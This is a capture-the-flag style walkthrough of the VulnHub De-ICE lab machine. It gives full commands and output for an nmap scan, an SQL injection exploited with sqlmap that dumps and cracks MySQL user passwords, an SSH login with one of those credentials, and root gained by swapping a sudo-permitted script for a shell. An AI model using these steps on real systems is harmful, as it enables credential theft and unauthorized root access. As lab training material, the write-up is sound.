De-ICE

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] SQL injection
[+] SQL Map --user --password --batch EXPLOITATION
[+] Privilege Escalation abusing SUDO rights  -  script
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.1.120
Host is up (0.00072s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        ProFTPD 1.3.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_dr-xr-xr-x   2 0        0              40 Jan  2  2011 incoming
22/tcp   open  ssh        OpenSSH 5.1 (protocol 2.0)
| ssh-hostkey: 
|   1024 5a:24:b1:79:0d:b3:91:15:fb:d2:86:ce:6a:50:8e:0f (DSA)
|_  2048 7e:e4:27:ad:3a:19:e8:73:c9:35:10:ea:49:ae:05:f3 (RSA)
80/tcp   open  http       Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
|_http-server-header: Apache/2.2.11 (Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0
|_http-title: Primaline :: Quality Kitchen Accessories
443/tcp  open  ssl/https?
|_ssl-date: 2019-10-14T05:41:12+00:00; 0s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_IDEA_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
3306/tcp open  mysql      MySQL (unauthorized)
MAC Address: 08:00:27:41:B2:87 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Network Distance: 1 hop
Service Info: OS: Unix

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After Creating a product on the web page we send the request to sqlmap, looking for a potential SQL injection

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/De-ICE/De-ICE.png)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

root@setrus:~# sqlmap -url "http://192.168.1.120/products.php?id=2" --dbs --batch
... snip ...
[01:49:02] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.2.11, PHP 5.2.9
back-end DBMS: MySQL >= 5.0.12
[01:49:02] [INFO] fetching database names
available databases [6]:
[*] cdcol
[*] information_schema
[*] merch
[*] mysql
[*] phpmyadmin
[*] test

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting the usernames and passwords with SQLmap

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# sqlmap -u "http://192.168.1.120/products.php?id=2" -D mysql --users --passwords --batch
... snip ...
database management system users password hashes:                              
[*] aadams [1]:
    password hash: *3EEB06BE54EABF909DC8F6107110777F1DE43186
    clear-text password: gawker
[*] aallen [1]:
    password hash: *D183105443FBDE597607B8BC5475A9E1B7847F3E
    clear-text password: gizmodo
[*] aard [1]:
    password hash: *626AC8265C7D53693CB7478376CE1B4825DFF286
    clear-text password: pepper
[*] aharp [1]:
    password hash: *F491287896471CB21030790BF46865C4A39DE651
    clear-text password: batman
[*] aheflin [1]:
    password hash: *81101DED975D54BD76A3C8EAD293597AE9BB143F
    clear-text password: computer
[*] amaynard [1]:
    password hash: *D6B63C1953E7F096DB307F8AC48C4AD703E57001
    clear-text password: sunshine
[*] aspears [1]:
    password hash: *DF216F57F1F2066124E1AA5491D995C3CB57E4C2
    clear-text password: welcome
[*] aweiland [1]:
    password hash: *A7D31514D37A55CE91C6C5DF97299CBC1B1937EC
    clear-text password: jordan
[*] bbanter [1]:
    password hash: *2A032F7C5BA932872F0F045E0CF6B53CF702F2C5
    clear-text password: 654321
[*] bphillips [1]:
    password hash: *44FFB04331ADAECB1FAB104F634E9B066BF8C6DC
    clear-text password: pokemon
[*] bwatkins [1]:
    password hash: *46CFC7938B60837F46B610A2D10C248874555C14
    clear-text password: trustno1
[*] cchisholm [1]:
    password hash: *FBA7C2D27C9D05F3FD4C469A1BBAF557114E5594
    clear-text password: Password
[*] ccoffee [1]:
    password hash: *94F3DC3F398B76269CAAD51627279D4233A6C89A
    clear-text password: soccer
[*] dcooper [1]:
    password hash: *2CE4701D02A76C12CD513109CA16967A68B4C23A
    clear-text password: princess
[*] dgilfillan [1]:
    password hash: *6691484EA6B50DDDE1926A220DA01FA9E575C18A
    clear-text password: abc123
[*] dgrant [1]:
    password hash: *84AAC12F54AB666ECFC2A83C676908C8BBC381B1
    clear-text password: 12345678
[*] djohnson [1]:
    password hash: *8D6A637F37955DBFCE1229204DDBED1CE11E6F41
    clear-text password: master
[*] dstevens [1]:
    password hash: *446525BB82B5E22BD9E525261D37C494F623C52B
    clear-text password: blahblah
[*] dtraylor [1]:
    password hash: *51AA306E66303073DBA15D2750E23C90C7A7F947
    clear-text password: baseball
[*] dwestling [1]:
    password hash: *4DC6D98E4CF6200B9F5529AFDE2E3B909F41E4D0
    clear-text password: kotaku
[*] hlovell [1]:
    password hash: *00A51F3F48415C7D4E8908980D443C29C69B60C9
    clear-text password: 12345
[*] jalcantar [1]:
    password hash: *FD571203974BA9AFE270FE62151AE967ECA5E0AA
    clear-text password: 111111
[*] jalvarez [1]:
    password hash: *22AC3D548EB2C2A2F4E609ADA63251D0AF795AD9
    clear-text password: nintendo
[*] jayala [1]:
    password hash: *3B477BC23EA39BFF66D64BFB68DB5EC5F5E31C91
    clear-text password: consumer
[*] jbresnahan [1]:
    password hash: *F8E113FD51D520075836A4B815568BA2B96F7C30
    clear-text password: dragon
[*] jdavenport [1]:
    password hash: *61305383748FBEAB119F9A8BC35EBBADB4889A9D
    clear-text password: babyl0n
[*] jduff [1]:
    password hash: *797420C584EBF42750EB523104268BA0FD87FBC8
    clear-text password: internet
[*] jfranklin [1]:
    password hash: *A4B6157319038724E3560894F7F932C8886EBFCF
    clear-text password: 1234
[*] kclemons [1]:
    password hash: *B021918A5DCA54916CF724573179571DFC37AC88
    clear-text password: jennifer
[*] krenfro [1]:
    password hash: *D37C49F9CBEFBF8B6F4B165AC703AA271E079004
    clear-text password: letmein
[*] ktso [1]:
    password hash: *7B2F14D9BB629E334CD49A1028BD85750F7D3530
    clear-text password: shadow
[*] kwebber [1]:
    password hash: *E56A114692FE0DE073F9A1DD68A00EEB9703F3F1
    clear-text password: 123123
[*] lmartinez [1]:
    password hash: *74B1C21ACE0C2D6B0678A5E503D2A60E8F9651A3
    clear-text password: passw0rd
[*] lmorales [1]:
    password hash: *79BF466BCC601BD91A0897BB162421F9BA8C29CA
    clear-text password: lifehack
[*] mbryan [1]:
    password hash: *DB1B792EC6DAE393BAE7AD832D3AF207C12E9A00
    clear-text password: michael
[*] mholland [1]:
    password hash: *AE9F960F8FA0994C9878D2245DA640EAFF09BA0E
    clear-text password: superman
[*] mnader [1]:
    password hash: *B12289EEF8752AD620294A64A37CD586223AB454
    clear-text password: 0
[*] mrodriguez [1]:
    password hash: *6A7A490FB9DC8C33C2B025A91737077A7E9CC5E5
    clear-text password: 1234567
[*] myajima [1]:
    password hash: *AA1420F182E88B9E5F874F6FBE7459291E8F4601
    clear-text password: qwerty
[*] qpowers [1]:
    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    clear-text password: password
[*] rdominguez [1]:
    password hash: *7FD9F123C9FC025372A5AAD19D107783CD19CCF7
    clear-text password: cheese
[*] rjacobson [1]:
    password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
    clear-text password: 123456
[*] rpatel [1]:
    password hash: *C5FEAC8A32D4FAFF1EF681447DA706634352AFF8
    clear-text password: killer
[*] sgains [1]:
    password hash: *90837F291B744BBE86DF95A37D2B2524185DBBF5
    clear-text password: whatever
[*] sjohnson [1]:
    password hash: *ED043A01F4583450BC8EB1E83C00C372CA49C4E4
    clear-text password: michelle
[*] strammel [1]:
    password hash: *FCAAF3F0BD94C027B2769A95903C355CE6294660
    clear-text password: football
[*] swarren [1]:
    password hash: *A5892368AE83685440A1E27D012306B073BDF5B7
    clear-text password: monkey
[*] tdeleon [1]:
    password hash: *B2B366CA5C4697F31D4C55D61F0B17E70E5664EC
    clear-text password: 666666
[*] tgoodchap [1]:
    password hash: *CFBF459D9D6057BC2A85477A38327B96F06B1597
    clear-text password: iloveyou
[*] webapp [1]:
    password hash: *0DCC22A95EEBFF4984DF6A7B7F2D7D28DBB5F36F

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


All the passwords for the users are cracked by sqlmap. All credentials are valid and we are able to login via ssh.
Trying user :ccoffee
Password : soccer


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh ccoffee@192.168.1.120
The authenticity of host '192.168.1.120 (192.168.1.120)' can't be established.
RSA key fingerprint is SHA256:NQU8D2MccXBM6OIRoPoW1uybptV7KCxpF63m0PC9T8U.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.120' (RSA) to the list of known hosts.
ccoffee@192.168.1.120's password: 
Linux 2.6.27.27.
ccoffee@slax:~$ ls
DONOTFORGET*  scripts/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ccoffee@slax:~$ sudo -l
User ccoffee may run the following commands on this host:
    (root) NOPASSWD: /home/ccoffee/scripts/getlogs.sh

ccoffee@slax:~$ ls
DONOTFORGET*  scripts/
ccoffee@slax:~$ ls -al
total 12
drwx------  3 ccoffee users  120 Oct 14 05:34 ./
dr-xr-xr-x 53 root    root  1040 Oct 14 05:34 ../
-rwx------  1 ccoffee users 3729 Oct 14 05:34 .screenrc*
-rwx------  1 ccoffee users  779 Oct 14 05:34 .xsession*
-rwx------  1 ccoffee users   57 Oct 14 05:34 DONOTFORGET*
drwx------  2 ccoffee users   60 Oct 14 05:34 scripts/
ccoffee@slax:~$ cd scripts/
ccoffee@slax:~/scripts$ ls
getlogs.sh*
ccoffee@slax:~/scripts$ cp getlogs.sh getlogs.sh.bak
cp: cannot open `getlogs.sh' for reading: Permission denied
ccoffee@slax:~/scripts$ ls -al                      
total 4
drwx------ 2 ccoffee users  60 Oct 14 05:34 ./
drwx------ 3 ccoffee users 120 Oct 14 05:34 ../
-rws--x--x 1 root    admin 110 Oct 14 05:34 getlogs.sh*
ccoffee@slax:~/scripts$ mv getlogs.sh getlogs.sh.back
ccoffee@slax:~/scripts$ echo '/bin/bash' > getlogs.sh
ccoffee@slax:~/scripts$ chmod +x getlogs.sh
ccoffee@slax:~/scripts$ sudo ./getlogs.sh
bash-3.1# i
bash: i: command not found
bash-3.1# d
bash: d: command not found
bash-3.1# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




